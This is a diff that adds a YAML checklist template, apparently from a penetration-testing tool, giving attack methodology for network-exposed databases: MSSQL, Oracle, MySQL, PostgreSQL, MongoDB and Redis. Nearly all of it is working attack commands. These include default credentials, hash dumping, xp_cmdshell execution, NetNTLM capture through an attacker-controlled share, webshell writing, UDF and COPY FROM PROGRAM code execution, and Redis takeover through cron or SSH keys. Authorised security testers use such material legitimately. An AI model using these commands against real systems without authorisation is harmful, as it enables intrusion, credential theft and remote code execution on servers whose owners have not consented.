@@ -1,0 +1,136 @@
+name: "Database"
+version: "1.0.0"
+author: "HackMind"
+tier: asset
+description: >
+  Direct database-service attack methodology for a database server reached over the
+  network (not via web SQL injection — that lives in the Web Application template).
+  Covers exposure and authentication, then engine-specific enumeration, privilege
+  escalation, and command execution for MSSQL, Oracle, MySQL/MariaDB, PostgreSQL,
+  MongoDB, and Redis.
+
+nodes:
+  - id: db_overview
+    type: info
+    title: "Database — orientation"
+    content: |
+      Point this asset at a database service found during discovery. First assess
+      exposure and try to authenticate (default/weak/harvested creds), then pick the
+      engine branch for enumeration, privilege escalation, and RCE.
+
+  - id: db_exposure
+    type: checklist
+    title: "Exposure and authentication"
+    content: |
+      - Confirm the service and version from the nmap -sV scan
+      - Is it reachable from an untrusted segment that shouldn't reach it?
+      - Is transport encrypted (TLS), or are credentials/queries in cleartext?
+      - Try default / blank / weak credentials for the engine (see branch below)
+      - Try credentials harvested from hosts, shares, configs, and code
+      - Check for anonymous / unauthenticated access (Redis, Mongo, ES often have none)
+
+  - id: q_db_type
+    type: question
+    title: "Which database engine is this?"
+    options:
+      - label: "Microsoft SQL Server"
+        key: "mssql"
+        children:
+          - id: db_mssql
+            type: checklist
+            title: "MSSQL attacks"
+            content: |
+              Connect: impacket-mssqlclient <user>:<pass>@<IP> -windows-auth / mssql-cli
+              - Default/weak: sa with blank or weak password; cme mssql <IP> -u sa -p <pass>
+              - Enumerate: SELECT @@version; databases; SELECT name FROM master..syslogins
+              - Command execution: EXEC xp_cmdshell 'whoami';
+                (enable: EXEC sp_configure 'show advanced',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE)
+              - Privilege escalation: EXECUTE AS LOGIN = 'sa'; impersonation (check with
+                SELECT * FROM sys.server_permissions); TRUSTWORTHY db -> sysadmin
+              - Linked servers: SELECT * FROM master..sysservers; EXEC ('xp_cmdshell ''whoami''') AT [LINKED]
+              - Capture NetNTLM: EXEC xp_dirtree '\\<attacker>\share'; -> relay / crack
+              - Tooling: cme mssql -M ... ; PowerUpSQL (Get-SQLServerLinkCrawl, Invoke-SQLOSCmd)
+
+      - label: "Oracle"
+        key: "oracle"
+        children:
+          - id: db_oracle
+            type: checklist
+            title: "Oracle attacks"
+            content: |
+              - SID enumeration: odat sidguesser -s <IP> -p 1521 ; nmap --script oracle-sid-brute
+              - Default creds: scott/tiger, system/manager, sys/change_on_install, dbsnmp/dbsnmp
+                odat passwordguesser -s <IP> -p 1521 -d <SID>
+              - All-in-one: odat all -s <IP> -p 1521 -d <SID> -U <user> -P <pass>
+              - Privesc / RCE: odat dbmsscheduler / externaltable / java for command execution
+              - PL/SQL injection in packages; UTL_HTTP / UTL_TCP for SSRF/exfil
+              - Read hashes: SELECT name,password,spare4 FROM sys.user$; crack with hashcat
+
+      - label: "MySQL / MariaDB"
+        key: "mysql"
+        children:
+          - id: db_mysql
+            type: checklist
+            title: "MySQL / MariaDB attacks"
+            content: |
+              - Default/weak: root with blank/weak password; mysql -h <IP> -u root -p
+              - Enumerate: SELECT version(); SELECT user,host,authentication_string FROM mysql.user;
+              - Dump hashes -> hashcat (-m 300 for newer, -m 200 old)
+              - FILE privilege: SELECT LOAD_FILE('/etc/passwd'); and INTO OUTFILE
+                (write a webshell if the DB user can write to a web root + secure_file_priv allows)
+              - UDF RCE: if FILE priv + writable plugin dir, load lib_mysqludf_sys -> sys_exec()
+              - Check for reused root password across hosts
+
+      - label: "PostgreSQL"
+        key: "postgres"
+        children:
+          - id: db_postgres
+            type: checklist
+            title: "PostgreSQL attacks"
+            content: |
+              - Default/weak: postgres/postgres ; psql -h <IP> -U postgres
+              - Enumerate: SELECT version(); \du (roles); SELECT * FROM pg_shadow;
+              - RCE (superuser): COPY cmd_out FROM PROGRAM 'id';
+                or CREATE FUNCTION ... LANGUAGE C for older versions
+              - File read/write: COPY ... FROM/TO ; pg_read_file('/etc/passwd'); large objects
+              - CVE-2019-9193 (COPY FROM PROGRAM), dblink for lateral DB access
+              - Tooling: cme postgres ; metasploit postgres modules
+
+      - label: "MongoDB"
+        key: "mongodb"
+        children:
+          - id: db_mongodb
+            type: checklist
+            title: "MongoDB attacks"
+            content: |
+              - Default: no authentication on older/default deployments
+              - Connect: mongosh "mongodb://<IP>:27017" ; show dbs; use <db>; db.<col>.find()
+              - Enumerate users: db.getUsers() ; db.system.users.find()
+              - Look for sensitive collections (creds, tokens, PII) readable unauthenticated
+              - If app-facing, NoSQL operator injection is covered in the Web App template
+
+      - label: "Redis"
+        key: "redis"
+        children:
+          - id: db_redis
+            type: checklist
+            title: "Redis attacks"
+            content: |
+              - Default: no auth; redis-cli -h <IP> PING -> PONG ; INFO ; CONFIG GET *
+              - RCE via cron: CONFIG SET dir /var/spool/cron/; CONFIG SET dbfilename root; SET x "...cmd..."; SAVE
+              - RCE via SSH key: write authorized_keys to a writable ~/.ssh
+              - RCE via module load (MODULE LOAD) or RogueServer master/slave replication exploit
+              - Dump keyspace for secrets/sessions; check for exposed Sentinel/Cluster ports
+
+      - label: "Other / Unknown"
+        key: "other_db"
+        children:
+          - id: db_other
+            type: checklist
+            title: "Generic database checks"
+            content: |
+              - Fingerprint exact product and version from the banner / nmap -sV
+              - Search NVD / exploit-db for the version
+              - Test default and weak credentials for that product
+              - Check for unauthenticated access and cleartext transport
+              - Look for management UIs (Adminer, phpMyAdmin, pgAdmin, Mongo Express) on web ports
